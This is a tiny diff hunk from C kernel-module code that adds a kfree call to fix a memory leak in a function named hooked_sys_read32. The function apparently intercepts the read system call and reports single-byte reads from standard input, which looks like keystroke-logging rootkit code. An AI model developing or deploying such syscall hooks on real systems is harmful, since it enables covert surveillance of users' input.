@@ -47,6 +47,7 @@ asmlinkage long hooked_sys_read32(unsigned int fd, char __user *buf, size_t coun
 	if(count == 1 && fd == 0)
 		print_info(i);
 
+	kfree(i->path);
 	kfree(i);
 
 	return r;
